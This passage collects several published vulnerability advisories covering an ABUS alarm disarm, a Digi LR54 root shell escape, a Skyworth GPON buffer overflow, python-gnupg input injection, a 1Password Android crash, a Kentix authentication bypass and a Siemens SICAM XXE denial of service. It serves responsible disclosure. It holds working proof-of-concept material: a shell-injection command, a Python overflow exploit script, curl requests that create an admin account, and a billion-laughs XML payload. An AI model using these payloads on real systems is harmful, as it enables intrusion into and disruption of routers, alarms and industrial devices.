transceiver that allows disarming the alarm system in an unauthorized
way. He provided his tool including documentation and source to SySS
GmbH for responsible disclosure purposes.
SySS GmbH could successfully perform a disarming attack against an ABUS
Secvest wireless alarm system by exploiting the unencrypted signal
transmission of the ABUS Secvest wireless remote controls FUBE50014 and
FUBE50015 and the predictable rolling code implementation using either
Mr. Detert's PoC tool, a developed Python tool for the RFCat-based radio
dongle YARD Stick One (see [3]), or a eZ430-Chronos (see [4]) with a
specially developed firmware.
Successful disarming attacks against an ABUS Secvest wireless alarm
system are shown in our SySS proof-of-concept video ""ABUS Secvest
Rolling Code PoC Attack"" [8].
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
SySS GmbH is not aware of a solution for this reported security
vulnerability.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2018-11-21: Vulnerability reported to manufacturer
2018-11-28: Vulnerability reported to manufacturer once more
2018-12-12: E-mail to ABUS support asking if they are going to give
some feedback regarding the reported security issue
2018-12-12: Phone call with ABUS support, the reported security
advisories were forwarded to the ABUS Security Center
Support
2018-12-12: E-mail to ABUS Security Center Support asking if they are
going to give some feedback regarding the reported security
issue
2019-01-14: Updated information regarding remote control ABUS Secvest
FUBE50015
2019-03-25: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product website for ABUS Secvest wireless alarm system
https://www.abus.com/eng/Home-Security/Alarm-systems/Secvest-wireless-alarm-system/Alarm-panels-and-kits/Secvest-Wireless-Alarm-System
[2] SySS Security Advisory SYSS-2016-117
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-117.txt
[3] Product website YARD Stick One
https://greatscottgadgets.com/yardstickone/
[4] Product website for Texas Instruments eZ430-Chronos
http://www.ti.com/tool/EZ430-CHRONOS
[5] SySS Security Advisory SYSS-2018-034
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-034.txt
[6] SySS Security Advisory SYSS-2018-035
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-035.txt
[7] SySS GmbH, SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
[8] SySS Proof-of-Concept Video: ABUS Secvest Rolling Code PoC Attack
https://youtu.be/pSdsMVn-7gM
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Thomas Detert.
Mr. Detert reported his finding to SySS GmbH where it was verified and
later reported to the manufacturer by Matthias Deeg.
E-Mail: matthias.deeg (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/Materialien/PGPKeys/Matthias_Deeg.asc
Key fingerprint = D1F0 A035 F06C E675 CDB9 0514 D9A4 BF6A 34AD 4DAB
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEE0fCgNfBs5nXNuQUU2aS/ajStTasFAlyUoKcACgkQ2aS/ajSt
Tav+OBAAnJ6Vb6DVHhNWevqYKGjdn5eIIIHcfIrwe4bzKbXusNIVK9okNNkZT9i+
hRZfVSFR21uyamh950qNujjizNhGUnD3mezPx5ep0R7tPxhwcp67kgVjRef4PNEE
p1rbhVFKKWlR4ygcmsAeKnnHQTGUK9UlYBlTt2RpPh4OCCRikPW0RuwfYuAxrvug
kDpWV/XA2DivteL68jDYzCdXHG2toph1FGmfv5CTx0NiyKD/XSm952c17z/D78Qz
AHvJT+xVMyZoUWqhSWHbwS+byBzVaXM2C3/89FBJ0YgolmrL1k8GvbYGe5fVlbBa
+PcHpp2yRbhuDgANCdLGEvWMCaflbqUPZN/xyaySF5HaKmpULvU44QEtg9CjDKNv
m0yyZDWaBAUMb574MsBZNAnFmyWPFuq1wd/hM5oxLoUyu6nbBlsLcpH/3E0LbJL0
ifNvk9KTsrvOItAV1fQl7/ccNcAeI+DB2yz44gtDaHjHvYCFjEHaQvws5a9L0PIF
XYRuHI+BNNIIi2KwivpnR316MA2MgE0hEny708sdS879qP1eZ5gDXcrVvUPFDsbA
DRH66TVPmoi2HMkKn95/PVLgqAYH0QFlGs3RkT+t7QS1K0gVCude4sTtxZFpT1A/
oxl2o8Kn4YhBDXvT9tUs1vaBFMO46MCgKF4yx3adPCRqK7twhiY=
=eZ14
-----END PGP SIGNATURE-----"
614,CVE-2018-20162: Digi TransPort LR54 Restricted Shell Escape,,CVE-2018-20162,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2018-20162: Digi TransPort LR54 Restricted Shell Escape
===========================================================
The Digi TransPort LR54 is a high speed LTE router commonly used by industry,
infrastructure, retail and public transportation.
It supports running python scripts in a restricted sandbox, and has a custom
shell accessible over SSH which is subjected to the same restrictions. The
underlying OS is inaccessible to the administrator.
I’ve found a way to break out of the sandbox and obtaining a root shell by
exploiting the way the cli handles command line arguments when executing python
scripts:
When an interactive python process receives a SIGINT (trough CTRL-C), arguments
to the script are not properly escaped when passed to the interactive CLI’s
error logging handler. This allows an attacker to execute arbitrary commands as
root.
To exploit this vulnerability, an attacker needs to have interactive CLI access
with ‘super’ privileges. A user with this access level is enabled by default on
the device.
Vulnerable
- ----------
Digi Transport LR54 (and maybe related products like WR64 and WR54)
Firmware Version : 4.4.0.26 10/29/2018 21:14:06
Firmware Version : 4.3.2.24 09/06/2018 00:58:34
And maybe earlier versions
Migitation
- ----------
Users should upgrade to firmware version 4.5.1.4 or newer.
Proof of Concept
- ----------------
1. Upload sleep.py to the LR54 using scp or sftp, containing:
import time;time.sleep(10)
2. Execute the following command in the LR54 cli:
python sleep.py --XXX $(/bin/sh -i >&2)
3. Immediately press CTRL-C after the program starts
4. You are then dropped to an interactive root shel
l
/home/digi/user # uname -a
Linux (none) 3.10.14 #1 SMP Mon Oct 29 16:18:10 CDT 2018 mips GNU/Linux
/home/digi/user # id
uid=0(root) gid=2000(users_rw) groups=2000(users_rw),2002(users_super)
Timeline
- --------
2018-12-13: Vulnerability discovered
2018-12-14: PoC created, Vendor notified
2018-12-14: Vendor confirmed, 60 day embargo. Applied for CVE.
2018-12-15: CVE-2018-20162 assigned
2018-12-31: Received pre-release firmware. Confirmed not vulnerable.
2019-01-02: Vendor releases fixed firmware 4.5.1.4
2019-01-25: Vendor updated release notes to reference CVE-2018-20162
2019-02-13: Vendor ok’ed disclosure, Embargo lifted
References
- ----------
https://www.digi.com/products/networking/cellular-routers/digi-transport-lr54
http://ftp1.digi.com/support/firmware/transport/LR54/v4.5.1.4/93001306_L.pdf
https://www.digi.com/resources/security
https://blog.hackeriet.no/cve-2018-20162-digi-lr54-restricted-shell-escape
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20162
Credits
- -------
Vulnerability discovered by Stig Palmquist.
Thanks to @duniel_pls and @alexanderkjall for reviewing this report.
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEEj7OMIAQn+GdSU5z5EMg4owYJR3UFAlxpeAsACgkQEMg4owYJ
R3XfMg//UDSALVhqqLc2Y7Yn8DxVOnSiFuobwPlseSKw0MigNbDbyBH6q8S9ozbe
n1razr2tpPQPx24MGqniGxsKGDi+b0S1zayQxy2TePUA5B5axOuiZZt9qWIKeWHA
HnAgjXN3x7Zv1yavJ/GxxlHJXOUCbOpMTeF32E26J4MssTJyEF1Q3p5YiF+/V2/b
ne5x4hKsMbKpMmHSdCEb3CawqSZOl7/Wh8j/N5WayLTei7WBp8q9xVxBUBhpK1JR
xUAClpsaiIKSSga1Q/QfXG9sTr/8/Kz6Mc3TD2YhZkEsujNP77N4ZwqByYB3wSMI
B8MCrprIJUgGoiYlfg3yehXnj+SEkMgDXExPcy4B69sutCrXmfqfwh7EzynHgFDe
mOPvpuYdHsxsWekoU8HN+Oux1iuJek0S5XL+5Lo/P+Tp1JXQ9dQU3wRN3ZfpjKqQ
rP9jJDJVwE2rZHGsYyvMYvHZG0iPPLlq9T855z/13aZ7YDkRx5tvVb4m7ZVNLuxz
6Z+J3CGktlPrilID6YBwrC+FotoAvJGrvWaYHXNEl7sQc5SJbazdZrQHBRF/i3zN
1sntgI2AYyH7kx+hEwFkoaDaCM+Xsfm5sBJ9QC8OKZ315RYWvJAS0HXG1lmyXFYo
u15TlfvsA9PcnAeHT4c/jLf24C8YyaFQ3YiZMmfnw12uiH+eOKE=
=zEym
-----END PGP SIGNATURE-----"
624,KSA-DEV-001: CVE-2018-19524 : StackOverflow in Multiple Skyworth GPON HomeGateways and Optical Network terminals.,,CVE-2018-19524,"========================================================
Unauthenticated Stack Overflow in Multiple Gpon Devices
========================================================
. contents:: Table Of Content
Overview
========
Title:- StackOverflow in Multiple Skyworth GPON HomeGateways and Optical Network terminals.
CVE-ID :- CVE-2018-19524
Author: Kaustubh G. Padwad
Vendor: Shenzhen Skyworth Digital Technology Company Ltd.(http://www.skyworthdigital.com/products)
Products:
1.DT741 Converged Intelligent Terminal (G/EPON+IPTV)
2.DT741 Converged Intelligent Terminal (G/EPON+IPTV)
3.DT721-cb GPON uplink home gateway (GPON+2FE+1POTS)
4.DT721-cb GPON Uplink Home Gateway (GPON+2FE+1POTS)
5.DT741-cb GPON uplink home gateway (GPON+4FE+1POTS+WIFI+USB)
6.DT741-cb GPON Uplink Home Gateway (GPON+4FE+1POTS+WIFI+USB)
7.DT741-cbGPON uplink home gateway DT741-cb
Tested Version: : Multiple versions
Severity: High--Critical
Advisory ID
============
KSA-Dev-001
About the Product:
==================
* The (products from above list) is a high performance GPON access gateway that complies with ITU-G.984 and CTC standards.
* Configure a GPON optical interface, two FEs, one POTS
* Provide Ethernet, VOIP and other interfaces to meet the access requirements of different devices.
* It can provide high-performance broadband access services for home users, individual users, and SOHO small businesses.
* Supports the standard TR069 protocol,which can be flexibly customized according to the carrier network and is compatible with mainstream OLT,software switching and service management platforms
Description:
============
An issue was discovered on Shenzhen Skyworth
DT741 Converged Intelligent Terminal (G/EPON+IPTV) SDOTBGN1,DT721-cb SDOTBGN1,and DT741-cb SDOTBGN1 devices.
A long password to the Web_passwd function allows remote attackers to cause a denial of service (segmentation fault) or
achieve unauthenticated remote code execution because of control of registers
S0 through S4 and T4 through T7.
Additional Information
========================
The value of password under Web_passwd function is not getting sanitized,so passing too much junk data to the password parameter triggers to the SIGSEGV segmentation fault in device, post research it
was possible to control the registers from S0-S4 and T4-T7.A Successful exploitation could leads to unauthenticated remote code execution on device.
[Affected Component]
web_passwd function inside the boa web server implementation.
------------------------------------------
[Attack Type]
Remote
------------------------------------------
[Impact Code execution]
true
------------------------------------------
[Impact Denial of Service]
true
------------------------------------------
[Attack Vectors]
Remote code execution by running the poc.py against the target ip address.
[Vulnerability Type]
====================
Buffer Overflow,Exec
How to Reproduce: (POC):
========================
One can use below exploit
import socket
import struct
buf = ""POST /cgi-bin/index2.asp HTTP/1.1 HOST: 192.168.1.1 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://192.168.1.2/cgi-bin/index2.asp Cookie: LoginTimes=0 Connection: Close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 1714 ""
buf+=""Username=Bufferoverflow""
buf+=""&Logoff=0""
buf+=""&LoginTimes=1""
buf+=""&LoginTimes_Zero=0""
buf+=""&value_one=1""
buf+=""&Password1=xss""
buf+=""&Password2=xss""
buf+=""&logintype=usr""
buf+=""&Password=""
buf+=""A""*999 #Padding till T4
buf+=""T4T4"" #T4 Address 0x2BB30D5C kill address based on libc
buf+=""T7T7"" #T7 sleep address based on libc
buf+=""B""*9 #Padding till T6
buf+= ""T6T6"" #T7 Address Sleep Address Based on libc negetive
buf+=""K""*8 #Padding between T6to s0
buf+=""S0S0"" #S0 Address sleep address boa possitive
buf+=""S1S1"" #S1 Address Sleep Address Boa negetive
buf+=""S2S2"" #S2 Address Normal Sleep Adress
buf+=""S3S3"" #S3Address System Address
buf+=""xA0x0ExA2x18"" #return Address
buf+=""K""*600
print buf
print ""[+] sending buffer size"", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((""192.168.1.1"", 80))
s.send(buf)
Mitigation
==========
No Official mitigation recived from vendor.
[Vendor of Product]
Shenzhen Skyworth Digital Technology Company Ltd.(http://www.skyworthdigital.com/products)
Disclosure:
===========
01-Nov-2018 Discoverd the vulnerability
03-Nov-2018 Reported to vendor (No Response)
13-Nov-2018 follow-up-01 (No reposonse.)
24-Nov-2018 Requested for CVE/Cve's.
26-Nov-2018 CVE-Assign by Mitre
credits:
========
* Kaustubh Padwad
* Information Security Researcher
* kingkaustubh me com
* https://s3curityb3ast.github.io/
* https://twitter.com/s3curityb3ast
* http://breakthesec.com
* https://www.linkedin.com/in/kaustubhpadwad"
657,CVE-2019-6690: Improper Input Validation in python-gnupg,,CVE-2019-6690,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
CVE-2019-6690: Improper Input Validation in python-gnupg
========================================================
We discovered a way to inject data through the passphrase property of
the gnupg.GPG.encrypt() and gnupg.GPG.decrypt() methods when symmetric
encryption is used.
The supplied passphrase is not validated for newlines, and the library
passes --passphrase-fd=0 to the gpg executable, which expects the
passphrase on the first line of stdin, and the ciphertext to be
decrypted or plaintext to be encrypted on subsequent lines.
By supplying a passphrase containing a newline an attacker can
control/modify the ciphertext/plaintext being decrypted/encrypted.
Vulnerable
- ----------
python-gnupg 0.4.3, and maybe earlier versions.
Mitigation
- ----------
Users should upgrade to 0.4.4.
Timeline
- --------
2019-01-19: Vulnerability discovered during Insomni’hack teaser 2019
2019-01-20: PoC created
2019-01-22: Applied for CVE, vendor notified
2019-01-23: CVE-2019-6690 assigned
2019-01-23: Vendor responded, fix committed
2019-01-24: Vendor released 0.4.4
References
- ----------
https://pypi.org/project/python-gnupg/
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6690
https://blog.hackeriet.no/cve-2019-6690-python-gnupg-vulnerability/
https://github.com/hackeriet/CVE-2019-6690-python-gnupg-vulnerability
https://ctftime.org/task/7458
Proof of Concept
- ----------------
Hypothetical application using successful decryption of data to authenticate a
user, and a way to exploit it is available here:
https://blog.hackeriet.no/assets/CVE-2019-6690-python-gnupg-vulnerability.tgz
https://blog.hackeriet.no/assets/CVE-2019-6690-python-gnupg-vulnerability.tgz.sig
Credits
- -------
Vulnerability discovered by Alexander Kjäll and Stig Palmquist.
Thanks to @dewaelethom who wrote the CTF challenge.
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCgAdFiEEj7OMIAQn+GdSU5z5EMg4owYJR3UFAlxK3b4ACgkQEMg4owYJ
R3XWpQ/9Ex7/vIH6k6gFXk2SXTEK19g8D1zsopPsQaE/uzvAARJrdGe0mxAtlqWo
Z5C/4w+4B4ioLK8wphFiFglvwNN/qxeTOXR3z5RoVbNSvd4BQ1GQR23N+rqob12P
Q4TorKNPjgvlG28aP1O3gywX0vAPtD6N3UITuFgEkUg22jF5vrWns8iX8jPzXfE+
y8FzXnydFXgLJy9+BPIKQ+cNz/jK341WbMav2AUNTWxlbgDymyBNYuWVK7QarFM4
93svE4Pg91EdsLzHctNNwMUg43pQgpnGaw5bUFA4LtNMSElu66Qdr7ZK3ViHrbWB
qXEPcbD3el7R4TJxfxVpJtpplMCRF+xDDOBbEVN5i37Ma2WRWVGuhizcZUS7V4Af
RvDl38o6aIX3ZHRlxIb2pG0FpQDC4Dzh0GCsEinYZCmvLfAu4OzcD0V+GPLmR21L
CzfaGBZJlv5d3poDC/uo5Pi6QOo2I0A6sp3ap76CNpEp/jMzWOkwAvTaYNWnJ51A
WzJecxYcf3qXPW+olR8QWqLydz96WEdJFB8xF5gS354eWV3FpYcaedqZVSwJYpGD
XLZ0lxEa2PGZvcXJ7XZzs4jNwqaisFELto/GLDVxzRFx1U3oe86rTO4KF+IyYUB7
+bFayUfunzmX3QQYzHVj6KgUh19heb6DpFxDp7kWMKxFPJRr6q8=
=7ajV
-----END PGP SIGNATURE-----"
664,CVE-2018-13042 - 1Password Android < 7.0 - Denial Of Service,,CVE-2018-13042,"############
Description
############
The 1Password application < 7.0 for Android is affected by a Denial Of
Service vulnerability. By starting the activity
com.agilebits.onepassword.filling.openyolo.OpenYoloDeleteActivity or
com.agilebits.onepassword.filling.openyolo.OpenYoloRetrieveActivity from an
external application (since they are exported), it is possible to crash the
1Password instance.
############
Poc
############
To invoke the exported activity and crash the app, it is possible
to use Drozer:
run app.activity.start --component com.agilebits.onepassword
com.agilebits.onepassword.filling.openyolo.OpenYoloDeleteActivity
############
Affected Components
############
com.agilebits.onepassword.filling.openyolo.OpenYoloDeleteActivity
com.agilebits.onepassword.filling.openyolo.OpenYoloRetrieveActivity
############
Disclosure timeline
############
2018-07-27 Contacting 1Password
2018-07-30 1Password acknowledges the vulnerability
2018-08-22 The vulnerability is fixed and made public
Valerio Brussani (@val_brux)"
676,[SYSS-2018-043] Authentication Bypass in Kentix MultiSensor LAN - CVE-2018-19783,,CVE-2018-19783,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
Advisory ID: SYSS-2018-043
Product: MultiSensor-LAN
Manufacturer: Kentix GmbH
Affected Version(s): 5.63.00 <=
Tested Version(s): 5.60.01, 5.63.00
Vulnerability Type: Authentication Bypass Using an Alternate Path or Channel (CWE-288)
Risk Level: High
Solution Status: Open
Manufacturer Notification: 2018-12-03
Solution Date: -
Public Disclosure: 2019-01-17
CVE Reference: CVE-2018-19783
Authors of Advisory: Micha Borrmann (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Kentix MultiSensor LAN is a web-based management solution for monitoring
server rooms (see [1]).
The web site authentication can be bypassed to add another administrator
account.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The web based application is not using a usual session concept with
a session cookie for managing authenticated user sessions. Some URLs
are protected with HTTP Basic Authentication, but the user management
web page can be accessed and used without any authentication.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The current user list can be read out without any authentication (all
values are Base64-encoded) using the following HTTP request:
$ curl --data 'action=0&A05000=1' --url http://$TARGETIP/io
{
""A05001"":""YWRtaW4="",
""A05002"":""KioqKioq"",
""A05003"":"""",
""A05021"":""MASKED"",
""A05022"":""KioqKioq"",
""A05023"":""MASKED"",
""A05041"":""MASKED"",
""A05042"":""KioqKioq"",
""A05043"":""MASKED"",
""A05061"":"""",
""A05062"":"""",
""A05063"":"""",
""A05081"":"""",
""A05082"":"""",
""A05083"":""""
}
There are five possible accounts, which are represented with the
fields A0500[1-3], A0502[1-3], and so on. The first field is the user
name, the second is the masked password, and the last one is the
optional e-mail address.
With the following simple HTTP request another user account is
created (username and password are sent Base64-encoded, too):
$ curl --data 'action=1&A05061=MWJj&A05062=MWJj&save=3' --url http://$TARGETIP/io
{
""A05061"":""MWJj"",
""A05062"":""KioqKioq""
}
With this created account, the web interface can be used very easily.
It can be verified that the user account was added successfully via
the previously shown HTTP request:
$ curl --data 'action=0&A05000=1' --url http://$TARGETIP/io
{
""A05001"":""YWRtaW4="",
""A05002"":""KioqKioq"",
""A05003"":"""",
""A05021"":""MASKED"",
""A05022"":""KioqKioq"",
""A05023"":""MASKED"",
""A05041"":""MASKED"",
""A05042"":""KioqKioq"",
""A05043"":""MASKED"",
""A05061"":""MWJj"",
""A05062"":""KioqKioq"",
""A05063"":"""",
""A05081"":"""",
""A05082"":"""",
""A05083"":""""
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
As there was no response from the vendor, SySS GmbH is not aware of a
solution for this security issue.
Kentix MultiSensor LAN devices should be operated only in firewall
protected LANs with enabled network access control to reduce the risk
of unauthorized manipulations.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2018-11-30: Detection of the vulnerability
2018-12-01: CVE number assigned
2018-12-03: Vulnerability reported to manufacturer
2019-01-17: Public release of the security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Support web site
https://kentix.com/en/download-support/software-manuals-for-devices-until-01-2018/
[2] SySS Security Advisory SYSS-2018-043
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2018-043.txt
[3] SySS Responsible Disclosure Policy
https://www.syss.de/en/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Micha Borrmann of SySS GmbH.
E-Mail: micha.borrmann (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Micha_Borrmann.asc
Key Fingerprint: F2E7 C6A5 9950 84ED 7AD6 0DD4 EDBE 26E7 14EA 5876
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory
may be updated in order to provide as accurate information as
possible. The latest version of this security advisory is available on
the SySS Web site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCAAdFiEE8ufGpZlQhO161g3U7b4m5xTqWHYFAlxAXiUACgkQ7b4m5xTq
WHZDug//cLSK7kjGDW3YSMDS7sCiJRtAl1gCPcdsPVgCaLpBnBp8aNKsylJhLxtc
AF72qpiB38PXpuuMz8MwbI8pGlsc31paZkGms/JJTuwrXfumX5YtbNRtjhgXDvmS
Si5JSvepH6zGRxfYihIFUAS/dchCa16zf4rCkyhCPKntPnk13eW0RkTYdX498PYv
oa8L2QZo2O0sADuwddpWi9CtFV+VQuaY70BUyNS/B2q/otPEuPog33o+8AW2xx0c
GNlahErbot48ZQTiwkGeBXDpP/kKWv8ccbY5dey1d4X53+X0zktKqhrYvTk2evGI
F7o1JzwpT7QhpS4ZFFY6Oc2ve/6CV6wZaQyXmrjKoW9yEKMDkoiAVl5ppDYIF4iS
NzKhiKOwlhyYrl1Ro4uZLSP92ePyxkEjjEwzEdXqXytQEB4Og1LhpHHmBKhBbr/V
yYfg3e9Mg+GOh7CDRiHl1tCI1+03c4Sz3pQE8oC3xsyy/jv5gj4GO44LtlYy2xxo
LDiw8/N0oPukjVrbFhtA8RX7fIOk/ZSsMhaj3Eca1SKantsHPxORCeXrcmkWom3v
H2WR1TFEXWfCTURsilW5Blifh2b47es/qhtZ6NeeDGQOPlFtf6/fnDd/N89qcLMz
USTQ5csy3Pr3ipLBWYtR2t/PSowoNyoWaE6O4d5LTfe1OtiIS1g=
=sH2y
-----END PGP SIGNATURE-----"
679,CVE-2018-13798 Siemens - SICAM A8000 Series Webinterface XXE DoS,,CVE-2018-13798,"#############################################################
#
# COMPASS SECURITY ADVISORY
# https://www.compass-security.com/research/advisories/
#
#############################################################
#
# Product: SICAM A8000 Series
# Vendor: Siemens
# CSNC ID: CSNC-2019-002
# CVE ID: CVE-2018-13798
# Subject: SICAM Webinterface XXE DoS
# Risk: Medium (CVSS 3.0 Base Score: 5.3)
# CVSS 3.0: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
# Effect: Unauthenticated remotely exploitable
# Authors: Emanuel Duss <emanuel.duss compass-security com>
# Nicolas Heiniger <nicolas.heiniger compass-security com>
# Date: 2019-01-14
#
#############################################################
Introduction
------------
The Siemens SICAM A8000 RTU (Remote Terminal Unit) series is a modular device
range for telecontrol and automation applications in all areas of energy
supply. This device offers a web management interface for performing simple
management tasks.
During a penetration test, Compass found a denial-of-service vulnerability in
the Siemens SICAM web server. The web management interface is vulnerable
against the XXE billion laughs attack [2] using XML entities. Successful
exploitation can be performed unauthenticated over the network.
Affected
--------
* SICAM A8000 CP-8000 < V14
* SICAM A8000 CP-802X < V14
* SICAM A8000 CP-8050 < V2.00
Technical Description
---------------------
When a login on the web management interface is performed, the following
request is sent to the server:
POST /sicweb-ajax/auth HTTP/1.1
Host: 10.5.23.42
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.5.23.42
Content-Type: application/xml
Content-Length: 118
Connection: close
<?xml version=""1.0"" encoding=""UTF-8""?>
<Cmd_LogOn><authentication user=""admin"" pwd=""P@ssw0rd""/><language id=""en""/></Cmd_LogOn>
By modifying the XML message, it's possible to perform a billion laughs denial
of service attack against the web management interface:
POST /sicweb-ajax/auth HTTP/1.1
Host: 10.5.23.42
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.5.23.42/
Content-Type: application/xml
Content-Length: 1679
Connection: close
<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE doc [
<!ENTITY c01 ""badger"">
<!ENTITY c02 ""&c01; &c01; &c01; &c01; &c01; &c01; &c01; &c01; &c01; &c01;"">
<!ENTITY c03 ""&c02; &c02; &c02; &c02; &c02; &c02; &c02; &c02; &c02; &c02;"">
<!ENTITY c04 ""&c03; &c03; &c03; &c03; &c03; &c03; &c03; &c03; &c03; &c03;"">
<!ENTITY c05 ""&c04; &c04; &c04; &c04; &c04; &c04; &c04; &c04; &c04; &c04;"">
<!ENTITY c06 ""&c05; &c05; &c05; &c05; &c05; &c05; &c05; &c05; &c05; &c05;"">
<!ENTITY c07 ""&c06; &c06; &c06; &c06; &c06; &c06; &c06; &c06; &c06; &c06;"">
<!ENTITY c08 ""&c07; &c07; &c07; &c07; &c07; &c07; &c07; &c07; &c07; &c07;"">
<!ENTITY c09 ""&c08; &c08; &c08; &c08; &c08; &c08; &c08; &c08; &c08; &c08;"">
<!ENTITY c10 ""&c09; &c09; &c09; &c09; &c09; &c09; &c09; &c09; &c09; &c09;"">
<!ENTITY c11 ""&c10; &c10; &c10; &c10; &c10; &c10; &c10; &c10; &c10; &c10;"">
<!ENTITY c12 ""&c11; &c11; &c11; &c11; &c11; &c11; &c11; &c11; &c11; &c11;"">
<!ENTITY c13 ""&c12; &c12; &c12; &c12; &c12; &c12; &c12; &c12; &c12; &c12;"">
<!ENTITY c14 ""&c13; &c13; &c13; &c13; &c13; &c13; &c13; &c13; &c13; &c13;"">
<!ENTITY c15 ""&c14; &c14; &c14; &c14; &c14; &c14; &c14; &c14; &c14; &c14;"">
<!ENTITY c16 ""&c15; &c15; &c15; &c15; &c15; &c15; &c15; &c15; &c15; &c15;"">
<!ENTITY c17 ""&c16; &c16; &c16; &c16; &c16; &c16; &c16; &c16; &c16; &c16;"">
<!ENTITY c18 ""&c17; &c17; &c17; &c17; &c17; &c17; &c17; &c17; &c17; &c17;"">
<!ENTITY c19 ""&c18; &c18; &c18; &c18; &c18; &c18; &c18; &c18; &c18; &c18;"">
<!ENTITY c20 ""&c19; &c19; &c19; &c19; &c19; &c19; &c19; &c19; &c19; &c19;"">
]>
<Cmd_LogOn><authentication user=""admin"" pwd=""P@ssw0rd""/><language id=""en""/>&c20;</Cmd_LogOn>
The XML parser on the device tries to resolve the external entities. This will
consume all available memory and the web management interface does not respond
anymore.
If the web management interface is refreshed in the browser, the following
message appears:
The device is currently unreachable. Retrying to connect.
Other services on the device, like the one used by the ToolboxII for
configuring the device or the IEC104 service, will still work properly and are
not affected by this attack. Only the web management interface remains unusable
until the device is rebooted.
It's not possible to use XXE to read local or remote files using the SYSTEM
directive.
Vulnerability Classification
----------------------------
* CVSS v3.0 Base Score: 5.3
* CVSS v3.0 Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P/RL:O/RC:C
Remediation
-----------
* SICAM A8000 CP-8000: Update to V14
* SICAM A8000 CP-802X: Update to V14
* SICAM A8000 CP-8050: Update to V2.00 or higher
Please see the Siemens advisory [3] for the download links.
As a workaround, it's also possible to restrict the access to the webserver on
